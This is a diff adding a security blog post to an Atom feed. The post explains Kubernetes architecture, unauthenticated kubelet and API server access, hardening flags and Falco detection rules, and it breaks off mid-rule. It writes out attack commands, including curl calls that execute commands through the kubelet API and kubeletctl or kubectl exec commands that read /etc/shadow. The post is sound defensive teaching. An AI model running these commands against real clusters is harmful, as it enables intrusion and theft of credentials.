@@ -1,4 +1,1562 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.4.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2025-09-29T16:06:32-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Heilan Cyber</title><subtitle>...in the pursuit of knowledge</subtitle><author><name>HC</name></author><entry><title type="html">Simulating Ransomware with AWS KMS</title><link href="http://localhost:4000/research/2025/09/02/aws-kms-ransomware.html" rel="alternate" type="text/html" title="Simulating Ransomware with AWS KMS" /><published>2025-09-02T00:00:00-05:00</published><updated>2025-09-02T00:00:00-05:00</updated><id>http://localhost:4000/research/2025/09/02/aws-kms-ransomware</id><content type="html" xml:base="http://localhost:4000/research/2025/09/02/aws-kms-ransomware.html"><![CDATA[<h2 id="introduction">Introduction</h2>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.4.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2025-12-16T17:30:12-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Heilan Cyber</title><subtitle>...in the pursuit of knowledge</subtitle><author><name>HC</name></author><entry><title type="html">A Brief Deep-Dive into Attacking and Defending Kubernetes</title><link href="http://localhost:4000/research/2025/12/16/kubernetes.html" rel="alternate" type="text/html" title="A Brief Deep-Dive into Attacking and Defending Kubernetes" /><published>2025-12-16T00:00:00-06:00</published><updated>2025-12-16T00:00:00-06:00</updated><id>http://localhost:4000/research/2025/12/16/kubernetes</id><content type="html" xml:base="http://localhost:4000/research/2025/12/16/kubernetes.html"><![CDATA[<h2 id="introduction">Introduction</h2>
+
+<p>When I first began writing this blog, I wanted to cover every single attack vector in Kubernetes. For anyone already acquainted with Kubernetes, you probably realize how daunting that is. I very quickly realized that I was far out of my depth and the scope for this post was reaching something unattainable. Before writing this, I had no idea just how vast Kubernetes is and I will definitely say I have a better idea now. My main motivation for writing this was to better understand for myself how Kubernetes works and its attack surface. I was also inspired from talking to people in the field and realizing just how prominent Kubernetes is in corporate environments.</p>
+
+<p>Although I did not cover every single attack vector here, I still cover a  large amount of topics in the hope that this will prove useful to others seeking to understand Kubernetes’ attack surface.</p>
+
+<ul>
+  <li><a href="#introduction">Introduction</a></li>
+  <li><a href="#how-kubernetes-works">How Kubernetes Works</a></li>
+  <li><a href="#threat-hunting-in-kubernetes">Threat Hunting in Kubernetes</a></li>
+  <li><a href="#attack-techniques-and-defensive-strategies">Attack Techniques and Defensive Strategies</a>
+    <ul>
+      <li><a href="#understanding-the-kubernetes-attack-surface"><strong>Understanding the Kubernetes Attack Surface</strong></a></li>
+      <li><a href="#unauthenticated-api-access"><strong>Unauthenticated API Access</strong></a></li>
+      <li><a href="#overly-permissive-role-based-access-control"><strong>Overly Permissive Role-based Access Control</strong></a></li>
+      <li><a href="#service-account-token-abuse"><strong>Service Account Token Abuse</strong></a></li>
+      <li><a href="#malicious-admission-controllers"><strong>Malicious Admission Controllers</strong></a></li>
+      <li><a href="#coredns-poisoning"><strong>CoreDNS Poisoning</strong></a></li>
+      <li><a href="#writable-volume-mounts"><strong>Writable Volume Mounts</strong></a></li>
+      <li><a href="#etcd-unauthorized-access"><strong>ETCD Unauthorized Access</strong></a></li>
+      <li><a href="#kubernetes-golden-ticket"><strong>Kubernetes Golden Ticket</strong></a></li>
+    </ul>
+  </li>
+  <li><a href="#conclusion">Conclusion</a></li>
+</ul>
+
+<h2 id="how-kubernetes-works">How Kubernetes Works</h2>
+
+<p>“Kubernetes”, also known as K8s, is an open source platform for container management originally developed by the Cloud Native Computing Foundation (CNCF). Containers allow users to bundle an application with all necessary requirements and run it consistently in different environments. Containers are isolated from each other and the host system, making them incredibly lightweight and portable. <a href="https://kubernetes.io/">With Kubernetes, users are able to deploy and manage containers in a distributed system environment</a>. It has become a staple for many organizations, with <a href="https://www.tigera.io/learn/guides/kubernetes-security/kubernetes-statistics/">60% of companies</a> adopting it in 2025 and 93% using or planning to use it in production.</p>
+
+<p>Kubernetes clusters can be deployed in several ways, most commonly either using local self-managed tools like <code class="language-plaintext highlighter-rouge">microk8s</code>, <code class="language-plaintext highlighter-rouge">minikube</code>, <code class="language-plaintext highlighter-rouge">K3s</code>, <code class="language-plaintext highlighter-rouge">kubeadm</code>, or through a managed cloud provider like Azure, AWS, or Google Cloud. Which deployment method to use depends greatly on the use case. For this blog, I am using <code class="language-plaintext highlighter-rouge">microk8s</code>, so some file locations used in the blog and detections may differ from other environments. If you would like to deploy your own microk8s cluster, I have created an easy-to-use lab setup script here: <a href="https://github.com/heilancoos/k8s-custom-detections/blob/main/lab-setup/setup.sh">https://github.com/heilancoos/k8s-custom-detections/blob/main/lab-setup/setup.sh</a></p>
+
+<p>Before diving into security concerns, it’s essential to understand Kubernetes’ core components and how they interact to better understand the attack surface.</p>
+
+<p>A Kubernetes cluster at a very minimum, consists of a <a href="https://kubernetes.io/docs/concepts/overview/components/">master node and a control plane</a>.</p>
+
+<h3 id="the-control-plane"><strong>The Control Plane</strong></h3>
+
+<p>The control plane manages the entire cluster and makes global decisions about scheduling and responding to cluster events. The core components of the control plane are the API server, <code class="language-plaintext highlighter-rouge">ETCD</code> , the scheduler, and the controller manager.</p>
+
+<p><img src="/img/kubernetes/kube-images/01-Introduction/01-controlplane.png" alt="image1" width="720" class="mx-auto d-block" /></p>
+
+<p>The API server is the core of a Kubernetes cluster. The API server exposes an HTTP API that allows users and cluster components to communicate. Every request to the API server goes through a process of checking authentication, authorization, and admission controls, which is explained in more detail later in this blog.</p>
+
+<p>In <code class="language-plaintext highlighter-rouge">microk8s</code>, the server manifest can be found at <code class="language-plaintext highlighter-rouge">/var/snap/microk8s/current/args/kube-apiserver</code>. The manifest has several options to handle the configuration of the cluster.</p>
+
+<p>A user can interact with the API through the command line tool, <code class="language-plaintext highlighter-rouge">kubectl</code>. <code class="language-plaintext highlighter-rouge">kubectl</code> allows users to modify and read configurations and the cluster state. <code class="language-plaintext highlighter-rouge">kubectl</code> is configured by the KubeConfig file which by default lives in <code class="language-plaintext highlighter-rouge">~/.kube/config</code>. The KubeConfig file defines where to send requests, identity, and credentials.</p>
+
+<p>Below is an example KubeConfig file:</p>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="na">apiVersion</span><span class="pi">:</span> <span class="s">v1</span>
+
+<span class="na">clusters</span><span class="pi">:</span>
+
+<span class="pi">-</span> <span class="na">cluster</span><span class="pi">:</span>
+
+    <span class="na">certificate-authority-data</span><span class="pi">:</span>
+
+    <span class="na">server</span><span class="pi">:</span> <span class="s">https://$IP:16443</span>
+
+  <span class="na">name</span><span class="pi">:</span> <span class="s">microk8s-cluster</span>
+
+<span class="na">contexts</span><span class="pi">:</span>
+
+<span class="pi">-</span> <span class="na">context</span><span class="pi">:</span>
+
+    <span class="na">cluster</span><span class="pi">:</span> <span class="s">microk8s-cluster</span>
+
+    <span class="na">user</span><span class="pi">:</span> <span class="s">admin</span>
+
+  <span class="na">name</span><span class="pi">:</span> <span class="s">microk8s</span>
+
+<span class="na">current-context</span><span class="pi">:</span> <span class="s">microk8s</span>
+
+<span class="na">kind</span><span class="pi">:</span> <span class="s">Config</span>
+
+<span class="na">preferences</span><span class="pi">:</span> <span class="pi">{}</span>
+
+<span class="na">users</span><span class="pi">:</span>
+
+<span class="pi">-</span> <span class="na">name</span><span class="pi">:</span> <span class="s">admin</span>
+
+  <span class="na">user</span><span class="pi">:</span>
+
+    <span class="na">client-certificate-data</span><span class="pi">:</span> 
+
+    <span class="na">client-key-data</span><span class="pi">:</span>
+
+</code></pre></div></div>
+
+<p>The important fields here are <code class="language-plaintext highlighter-rouge">server</code>, which defines the API endpoint that <code class="language-plaintext highlighter-rouge">kubectl</code> will connect to, <code class="language-plaintext highlighter-rouge">user</code> which defines the user you are attempting to authenticate as, and <code class="language-plaintext highlighter-rouge">client-certificate-data</code> which the API server checks against the client Certificate Authority(CA).</p>
+
+<p>The API server directly communicates with the remaining 3 components of the control plane, <code class="language-plaintext highlighter-rouge">ETCD</code>, the Scheduler, and the Controller Manager.</p>
+
+<p><code class="language-plaintext highlighter-rouge">ETCD</code> is a <a href="https://kubernetes.io/docs/tasks/administer-cluster/configure-upgrade-etcd/">key-value store</a> that holds the entire cluster state, meaning things like pods, ConfigMaps, secrets, ServiceAccounts, roles, and nodes all live in <code class="language-plaintext highlighter-rouge">ETCD</code>. Although uncommon, users can interact directly with <code class="language-plaintext highlighter-rouge">ETCD</code> via <code class="language-plaintext highlighter-rouge">etcdctl</code> and <code class="language-plaintext highlighter-rouge">etcdutl</code>.</p>
+
+<p><code class="language-plaintext highlighter-rouge">kube-scheduler</code> decides which node a pod should run on. Once it picks a node, it relays that information to the API server and the <code class="language-plaintext highlighter-rouge">kubelet</code> performs the pod creation.</p>
+
+<p><code class="language-plaintext highlighter-rouge">kube-controller-manager</code> runs controller processes that regulate the cluster state. For example, if a deployment says 3 replicas, it ensures that 3 pods are always running.</p>
+
+<h3 id="nodes"><strong>Nodes</strong></h3>
+
+<p>The API server also coordinates the nodes which actually run the workloads. Nodes consist of kubelets, container runtime,  pods, and proxies.</p>
+
+<p><code class="language-plaintext highlighter-rouge">kubelet</code> is the component that actually communicates with the API server. These agents run on every node and ensure the pods created are running and healthy.</p>
+
+<p>A container runtime is a fundamental component responsible for managing the execution and lifecycle of containers in Kubernetes.</p>
+
+<p>The <code class="language-plaintext highlighter-rouge">kube-proxy</code> manages network rules on each node. It routes traffic to the correct pods.</p>
+
+<p>Pods run inside nodes and are the smallest deployable unit. A pod is a group of one or more containers with shared storage and network resources.</p>
+
+<h3 id="other-relevant-kubernetes-components"><strong>Other Relevant Kubernetes Components</strong></h3>
+
+<p><strong>Namespaces</strong> provide logical isolation within a cluster, grouping resources like Pods, Services, ConfigMaps, and secrets. There are 4 initial namespaces within Kubernetes, <code class="language-plaintext highlighter-rouge">default</code>, <code class="language-plaintext highlighter-rouge">kub-node-lease</code>, <code class="language-plaintext highlighter-rouge">kube-public</code>, and <code class="language-plaintext highlighter-rouge">kube-system</code>. These 4 namespaces serve as stepping off points for resource management.</p>
+
+<p><strong>ConfigMaps</strong> are API objects used to store non-sensitive data in key-value pairs. Rather than hard-coding environment variables or config files inside a container image, ConfigMaps can store this data and mount them into pods at runtime.</p>
+
+<p><strong>Secrets</strong> are the Golden Snitch when it comes to attacking a Kubernetes cluster. Secrets are used to store sensitive information like credentials and are encoded in base64. Just like ConfigMaps, they can be mounted into pods as files or environment variables.</p>
+
+<h3 id="security-concerns"><strong>Security Concerns</strong></h3>
+
+<p>Kubernetes is rapidly gaining popularity, with more and more cloud providers integrating it into their platforms, and everything has its risks.</p>
+
+<p>Every component of Kubernetes can be made vulnerable in some way. In a misconfigured environment an attacker can escalate their privileges or steal secrets.</p>
+
+<p>Microsoft’s threat matrix for Kubernetes illustrates the breadth of potential attack vectors across the MITRE ATT&amp;CK framework. From initial access through privilege escalation to data exfiltration, every component presents potential vulnerabilities when misconfigured.</p>
+
+<p><img src="/img/kubernetes/kube-images/01-Introduction/01-controlplane.png" alt="image1" width="720" class="mx-auto d-block" /></p>
+
+<p>This blog will cover some of the most pertinent attack techniques affecting Kubernetes clusters in the wild. I’ll also use Falco to engineer detections and provide actionable mitigations for the attacks.</p>
+
+<h2 id="threat-hunting-in-kubernetes">Threat Hunting in Kubernetes</h2>
+
+<p>Kubernetes’ complexity can make threat detection challenging for security teams. As clusters grow in scale, maintaining visibility into potential security threats becomes increasingly difficult. Thankfully there are open-source tools to help bridge this gap.</p>
+
+<h3 id="falco"><strong>Falco</strong></h3>
+
+<p><a href="https://falco.org/">Falco is an open-source security tool</a> designed specifically cloud-native environments. The project is currently maintained by CNCF. It enables real-time protection by ingesting kernel syscalls and <a href="https://github.com/falcosecurity/plugins/tree/main/plugins/k8saudit">Kubernetes audit logs</a>. With host-level visibility and control plane metadata, Falco can detect a wide range of events. It’s a strong complement to static security controls like role-based access controls (RBAC), NetworkPolicies, or Admission Controllers.</p>
+
+<h4 id="writing-rules-for-falco">Writing Rules for Falco</h4>
+
+<p>This blog will provide some ready-to-use detection rules for detecting common Kubernetes attack attacks. But it is still helpful to have an understanding of the anatomy of a Falco detection rule and how its detection logic works.</p>
+
+<p>If you installed Falco with <a href="https://helm.sh/docs/intro/install/">Helm</a> as I did, then the default Falco rules live in the Falco container at <code class="language-plaintext highlighter-rouge">/etc/falco/falco_rules.yaml</code>. These rules are already set up to detect suspicious behavior. For example, one of the default rules trigger whenever an attempt is made to read a sensitive file so a command like this:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl <span class="nb">exec</span> <span class="nt">-it</span> <span class="si">$(</span>kubectl get pods <span class="nt">--selector</span><span class="o">=</span><span class="nv">app</span><span class="o">=</span>nginx <span class="nt">-o</span> name<span class="si">)</span> <span class="nt">--</span> <span class="nb">cat</span> /etc/shadow  
+</code></pre></div></div>
+
+<p>Generates an alert like this: <br />
+<img src="/img/kubernetes/kube-images/01-Introduction/03-falco-demo.png" alt="image3" width="720" class="mx-auto d-block" /></p>
+
+<p>Falco rules are written in YAML and contain basic fields like <code class="language-plaintext highlighter-rouge">rule</code>, <code class="language-plaintext highlighter-rouge">desc</code>, <code class="language-plaintext highlighter-rouge">condition</code>, <code class="language-plaintext highlighter-rouge">output</code>, and <code class="language-plaintext highlighter-rouge">priority</code>. The rule for the above alert looks like this:</p>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="pi">-</span> <span class="na">rule</span><span class="pi">:</span> <span class="s">Read sensitive file untrusted</span>  
+  <span class="na">desc</span><span class="pi">:</span> <span class="pi">&gt;</span>  
+    <span class="s">An attempt to read any sensitive file   </span>
+  <span class="na">condition</span><span class="pi">:</span> <span class="pi">&gt;</span>  
+    <span class="s">open_read  </span>
+    <span class="s">and sensitive_files  </span>
+    <span class="s">and proc_name_exists  </span>
+    <span class="s">and not … //list of exceptions  </span>
+  <span class="na">output</span><span class="pi">:</span> <span class="s">Sensitive file opened for reading by non-trusted program (file=%fd.name gparent=%proc.aname[2] ggparent=%proc.aname[3] gggparent=%proc.aname[4] evt_type=%evt.type user=%user.name user_uid=%user.uid user_loginuid=%user.loginuid process=%proc.name proc_exepath=%proc.exepath parent=%proc.pname command=%proc.cmdline terminal=%proc.tty %container.info)</span>  
+  <span class="na">priority</span><span class="pi">:</span> <span class="s">WARNING</span>  
+  <span class="na">tags</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">maturity_stable</span><span class="pi">,</span> <span class="nv">host</span><span class="pi">,</span> <span class="nv">container</span><span class="pi">,</span> <span class="nv">filesystem</span><span class="pi">,</span> <span class="nv">mitre_credential_access</span><span class="pi">,</span> <span class="nv">T1555</span><span class="pi">]</span>  
+</code></pre></div></div>
+<p>Let’s take a look at the key fields.</p>
+
+<p>The <code class="language-plaintext highlighter-rouge">condition</code> field defines the circumstance under which the rule will trigger.</p>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">condition</span><span class="pi">:</span> <span class="pi">&gt;</span>  
+    <span class="s">open_read  </span>
+    <span class="s">and sensitive_files  </span>
+    <span class="s">and proc_name_exists  </span>
+    <span class="s">and not … //list of exceptions   </span>
+</code></pre></div></div>
+
+<p>At a high level, this rule fires when a process opens a sensitive file, such as <code class="language-plaintext highlighter-rouge">/etc/shadow</code>, inside a container. Falco evaluates the event against these conditions and generates the alert if they match.</p>
+
+<p>Priority refers to the severity level and has the following options:</p>
+
+<p><code class="language-plaintext highlighter-rouge">EMERGENCY</code><br />
+<code class="language-plaintext highlighter-rouge">ALERT</code><br />
+<code class="language-plaintext highlighter-rouge">ERROR</code><br />
+<code class="language-plaintext highlighter-rouge">WARNING</code><br />
+<code class="language-plaintext highlighter-rouge">NOTICE</code><br />
+<code class="language-plaintext highlighter-rouge">INFORMATIONAL</code><br />
+<code class="language-plaintext highlighter-rouge">DEBUG</code></p>
+
+<p>There are additional optional rule keys as well such as <code class="language-plaintext highlighter-rouge">exceptions</code>, <code class="language-plaintext highlighter-rouge">enabled</code>, <code class="language-plaintext highlighter-rouge">tags</code>, <code class="language-plaintext highlighter-rouge">source</code>, and more.</p>
+
+<p>Falco loads custom detection rules from <code class="language-plaintext highlighter-rouge">/etc/falco/rules.d</code>, and Helm makes it <a href="https://falco.org/docs/concepts/rules/custom-ruleset/#rules-placement">easy to bundle your own rules</a> alongside the default ruleset with:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>helm upgrade <span class="nt">--namespace</span> falco falco falcosecurity/falco <span class="nt">-f</span> values.yaml	
+</code></pre></div></div>
+
+<p>All of the custom rules used throughout this blog are available in this repository: <a href="https://github.com/heilancoos/k8s-custom-detections/tree/main">https://github.com/heilancoos/k8s-custom-detections/tree/main</a></p>
+
+<h3 id="falco-sidekick"><strong>Falco Sidekick</strong></h3>
+
+<p>Falco Sidekick serves as a routing engine for security alerts. When a Falco rule is triggered, Sidekick can forward these alerts to multiple third-party platforms such as Slack, Datadog, Prometheus, and more. <br />
+<img src="/img/kubernetes/kube-images/01-Introduction/04-falcosidekick_forwarding.png" alt="image4" width="720" class="mx-auto d-block" /></p>
+
+<p>source: <a href="https://falco.org/docs/concepts/outputs/forwarding/">https://falco.org/docs/concepts/outputs/forwarding/</a></p>
+
+<p>Falco Sidekick UI provides a web based dashboard where security teams can visualize and investigate alerts.</p>
+
+<p>Example detection in Falco:</p>
+
+<p><img src="/img/kubernetes/kube-images/01-Introduction/05-sidekick-alert.png" alt="image5" width="720" class="mx-auto d-block" /></p>
+
+<p>Falco represents a critical layer in a defense-in-depth Kubernetes security strategy, providing the runtime visibility needed to detect threats that bypass defenses.</p>
+
+<h2 id="attack-techniques-and-defensive-strategies">Attack Techniques and Defensive Strategies</h2>
+
+<h3 id="understanding-the-kubernetes-attack-surface"><strong>Understanding the Kubernetes Attack Surface</strong></h3>
+
+<p>Before discussing more about specific attack techniques, it can help to understand how attackers think about Kubernetes as an environment.</p>
+
+<p>An attacker’s goal can vary greatly, but in general they will seek a way to either modify the cluster state or extract sensitive information. There are four major key categories of attack surface an attacker will typically target.</p>
+
+<ul>
+  <li>
+    <p><strong>Control Plane entry points</strong> such as the API Server, kubelet API, and <code class="language-plaintext highlighter-rouge">ETCD</code>. If an attacker is able to obtain access to any of these, they would be able to potentially modify Kubernetes objects, execute commands, or steal Secrets.</p>
+  </li>
+  <li>
+    <p><strong>Identity and Access mechanisms</strong> such as RBAC roles, ServiceAccounts, and kubeconfig files, if compromised, can allow an attacker to escalate privileges and hide their actions under an authorized identity.</p>
+  </li>
+  <li>
+    <p><strong>Cluster configuration components</strong> like CoreDNS and admission controllers influence how workloads behave and how the API server enforces rules. If an attacker is able to modify them, they can change how the cluster operates.</p>
+  </li>
+  <li>
+    <p><strong>Pod weaknesses</strong> like application vulnerabilities, privileged containers, and hostPath mounts can provide an attacker with a foothold in the cluster. If that foothold is not properly secured, it could lead to full cluster compromise. An attacker gaining remote code execution (RCE) on a pod through an application vulnerability is an extremely common initial access vector.</p>
+  </li>
+</ul>
+
+<p>These core categories are the foundation of the Kubernetes attack surface. Every technique in the following sections can be categorized into one or more of these categories.</p>
+
+<h3 id="unauthenticated-api-access"><strong>Unauthenticated API Access</strong></h3>
+
+<p>As discussed in the <a href="#the-control-plane">Control Plane</a> section, the API server is the control center for Kubernetes. It facilitates communication between all components and processes every request. Its security posture directly impacts the entire cluster’s attack surface.</p>
+
+<p><code class="language-plaintext highlighter-rouge">kubelet</code>, on the other hand, is the primary agent running on each node on the cluster. It exposes a REST API that allows Kubernetes to manage containers, retrieve logs, run health checks, and more. Although <code class="language-plaintext highlighter-rouge">kubelet</code> is documented, its API is not meant for direct user access and is far less documented than the API server.</p>
+
+<p>Both the API server and the kubelet API can permit anonymous requests depending on how they are configured. Any request that is not rejected by another authentication method is treated as an anonymous request with the user identity <code class="language-plaintext highlighter-rouge">system:anonymous</code> and the group membership <code class="language-plaintext highlighter-rouge">system:unauthenticated</code>. However even if anonymous authentication is allowed, the set Authorization Mode will determine what anonymous requests are allowed.</p>
+
+<p><img src="/img/kubernetes/kube-images/02-unauth-api/01-kubelet/01-command-curl.png" alt="image6" width="720" class="mx-auto d-block" /></p>
+
+<h4 id="kubelet-api">Kubelet API</h4>
+
+<p>The <code class="language-plaintext highlighter-rouge">kubelet</code> API usually listens on port <em>10250/TCP</em> on the host. Some outdated clusters may also expose the read-only API on port <em>10255/TCP</em> which never required authentication. It can perform authentication through 3 methods: anonymous access, client certificate authentication, or API bearer tokens. Any request that is authenticated is then authorized in default configurations. Unlike the API Server, the default authorization mode for the kubelet API is <code class="language-plaintext highlighter-rouge">AlwaysAllow</code> and it does not use RBAC at all.</p>
+
+<p>Anonymous access to the <code class="language-plaintext highlighter-rouge">kubelet</code> API can be tested by running:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-k</span> <span class="o">[</span>https://127.0.0.1:10250/pods]<span class="o">(</span>https://127.0.0.1:10250/pods<span class="o">)</span>   
+</code></pre></div></div>
+<p>Commands can also be executed through the <code class="language-plaintext highlighter-rouge">kubelet</code> API:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-k</span> <span class="nt">-X</span> POST <span class="s2">"https://127.0.0.1:10250/run/default/nginx/nginx?cmd=ls"</span>  
+</code></pre></div></div>
+
+<p><img src="/img/kubernetes/kube-images/02-unauth-api/01-kubelet/01-command-curl.png" alt="image6" width="720" class="mx-auto d-block" /></p>
+
+<p>Alternatively, CyberArk’s <code class="language-plaintext highlighter-rouge">kubeletctl</code> provides an easy-to-use interface for interacting with kubelet’s API. It’s an incredibly powerful tool that can enumerate pod information, retrieve logs, execute commands inside containers, attach into containers, and map processes to pods.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubeletctl pods <span class="nt">-i</span>  
+</code></pre></div></div>
+<p><img src="/img/kubernetes/kube-images/02-unauth-api/01-kubelet/02-kubletctlgetpods.png" alt="image7" width="720" class="mx-auto d-block" /></p>
+
+<p>With access to the API, an attacker would also be able to execute commands into containers. For example, with <code class="language-plaintext highlighter-rouge">kubeletctl</code> we are able to specify which pod and container to execute commands in:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubeletctl <span class="nb">exec</span> <span class="s2">"cat /etc/shadow"</span> <span class="nt">-p</span> <span class="nv">$pod</span> <span class="nt">-c</span> <span class="nv">$container</span><span class="nt">-name</span>  
+</code></pre></div></div>
+<p><img src="/img/kubernetes/kube-images/02-unauth-api/01-kubelet/03-kubletctlexecdemo.png" alt="image8" width="720" class="mx-auto d-block" /></p>
+
+<p>From an attacker’s perspective, compromising <code class="language-plaintext highlighter-rouge">kubelet</code> means node-level privileges. <code class="language-plaintext highlighter-rouge">kubelet</code> can be used to laterally move into other pods or extract secrets mounted into application containers.</p>
+
+<h4 id="api-server">API Server</h4>
+
+<p>The impact of anonymous authentication on the API server depends entirely on how authorization is configured. Kubernetes evaluates what a user is allowed to do using RBAC or another authorization policy. If there are any overly permissive roles that the anonymous user is bound to then <code class="language-plaintext highlighter-rouge">system:anonymous</code> becomes much more dangerous. Depending on what is exposed, they could list pods, or retrieve sensitive ConfigMaps.</p>
+
+<p>The simplest way to determine whether anonymous access is allowed is to send a request to the API endpoint with no credentials.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-k</span> https://<span class="nv">$API</span>:16443/api  
+</code></pre></div></div>
+
+<p><img src="/img/kubernetes/kube-images/02-unauth-api/02-apiserver/01-curlapi-demo.png" alt="image9" width="720" class="mx-auto d-block" /></p>
+
+<p>The response code 403 Forbidden indicates that anonymous requests are allowed but RBAC is blocking access.</p>
+
+<p>Once you know anonymous auth is enabled, you can enumerate the API to see what data an unauthenticated user can reach. I wrote a simple <a href="https://github.com/heilancoos/k8s-custom-detections/blob/main/examples/check_anonymous_k8s.py">script</a> to do this:</p>
+
+<p><img src="/img/kubernetes/kube-images/02-unauth-api/02-apiserver/02-api-enum.png" alt="image10" width="720" class="mx-auto d-block" /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> curl <span class="nt">-k</span> <span class="o">[</span>https://127.0.0.1:16443/api/v1/namespaces/default/pods]<span class="o">(</span>https://127.0.0.1:16443/api/v1/namespaces/default/pods<span class="o">)</span>  
+</code></pre></div></div>
+
+<p><img src="/img/kubernetes/kube-images/02-unauth-api/02-apiserver/03-api-pods-anon-curl.png" alt="image11" width="720" class="mx-auto d-block" /></p>
+
+<p>While <code class="language-plaintext highlighter-rouge">curl</code> shows what unauthenticated users can <em>actually</em> access, you can also test how RBAC would treat the anonymous user by impersonating it:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl auth <span class="nb">whoami</span> <span class="nt">--as</span><span class="o">=</span>system:anonymous  
+kubectl auth can-i <span class="nt">--list</span> <span class="nt">--as</span><span class="o">=</span>system:anonymous   
+</code></pre></div></div>
+<p><img src="/img/kubernetes/kube-images/02-unauth-api/02-apiserver/04-auth-can-list.png" alt="image12" width="720" class="mx-auto d-block" /></p>
+
+<p>In the worst case scenario, if <code class="language-plaintext highlighter-rouge">system:anonymous</code> has the permissions of <code class="language-plaintext highlighter-rouge">cluster-admin</code>, an attacker would completely own the cluster.</p>
+
+<p>From a defender’s perspective, protecting the API server is similar to protecting the domain controller in Active Directory. It is the authoritative identity provider, policy engine, and entry point for every administrative operation.</p>
+
+<h4 id="unauthenticated-api-access-defensive-strategies">Unauthenticated API Access Defensive Strategies</h4>
+
+<h5 id="disable-unauthenticated-access-to-api-server-and-kubelet-api">Disable Unauthenticated Access to API Server and kubelet API</h5>
+
+<p>Set the API server flag <code class="language-plaintext highlighter-rouge">--anonymous-auth</code> to <code class="language-plaintext highlighter-rouge">false</code> in <code class="language-plaintext highlighter-rouge">/var/snap/microk8s/current/args/kube-apiserver</code> so that every request must be authenticated by a recognized method such as client certificates, service account tokens, or OIDC.</p>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">--anonymous-auth=false</span>  
+</code></pre></div></div>
+
+<p><img src="/img/kubernetes/kube-images/02-unauth-api/03-defensivestrategies/01-noanonapiserver.png" alt="image15" width="720" class="mx-auto d-block" /></p>
+
+<p>The same can be done for <code class="language-plaintext highlighter-rouge">kubelet</code> in <code class="language-plaintext highlighter-rouge">/var/snap/microk8s/current/args/kubelet</code>:</p>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">--anonymous-auth=false</span>  
+</code></pre></div></div>
+<p><img src="/img/kubernetes/kube-images/02-unauth-api/03-defensivestrategies/02-nomoreanonkubelet.png" alt="image16" width="720" class="mx-auto d-block" /></p>
+
+<h5 id="enable-client-certificate-authentication-for-the-kubelet-api">Enable Client Certificate Authentication for the Kubelet API</h5>
+
+<p>Kubelet supports several authentication methods, but the recommended option is to require clients to present a valid client certificate.<br />
+Enabling client certificate authentication can be done by setting the <code class="language-plaintext highlighter-rouge">--client-ca-file</code> flag and starting the API server with <code class="language-plaintext highlighter-rouge">--kubelet-client-certificate</code> and <code class="language-plaintext highlighter-rouge">--kubelet-client-key flags.</code></p>
+
+<h5 id="delegate-kubelet-api-authorization-to-the-api-server">Delegate Kubelet API authorization to the API Server</h5>
+
+<p>To enforce an authorization mode other than <code class="language-plaintext highlighter-rouge">AlwaysAllow</code> which can be dangerous if the authentication mode is set to <code class="language-plaintext highlighter-rouge">anonymous</code>, kubelet can be started with these flags:</p>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">--authorization-mode=Webhook</span>  
+<span class="c1"># in microk8s</span>
+<span class="s">--kubeconfig=/var/snap/microk8s/current/credentials/kubelet.config</span> 
+</code></pre></div></div>
+<p>In this mode, kubelet sends a <code class="language-plaintext highlighter-rouge">SubjectAccessReview</code> to the API server for each incoming request. RBAC rules determine whether the request is allowed.</p>
+
+<p>For example, even though anonymous requests are allowed, the request is then checked against the authorization policy to determine whether it should be allowed:</p>
+
+<p><img src="/img/kubernetes/kube-images/02-unauth-api/03-defensivestrategies/04-kubeletauth.png" alt="image71" width="720" class="mx-auto d-block" /></p>
+
+<h5 id="configure-rbac-to-deny-unauthenticated-requests">Configure RBAC to Deny Unauthenticated Requests</h5>
+
+<p>If you must maintain anonymous authentication for operational reasons, explicitly deny dangerous permissions to unauthenticated users. Kubernetes processes RBAC rules in order so you should ensure explicit denials for <code class="language-plaintext highlighter-rouge">system:unauthenticated</code> take precedence over permissive rules.</p>
+
+<h5 id="admission-controls">Admission Controls</h5>
+
+<p>Use <a href="#understanding-admission-controllers">validating and mutating admission controllers</a> to enforce strict policies. For example, a validating webhook can reject pod creation attempts from unauthenticated identities, or a mutating webhook can ensure defaults that limit blast radius.</p>
+
+<h4 id="api-detections-in-falco">API Detections in Falco</h4>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="pi">-</span> <span class="na">rule</span><span class="pi">:</span> <span class="s">Anonymous Request Allowed</span>
+  <span class="na">desc</span><span class="pi">:</span> <span class="pi">&gt;</span>
+    <span class="s">Detect any request made by the anonymous user that was allowed.</span>
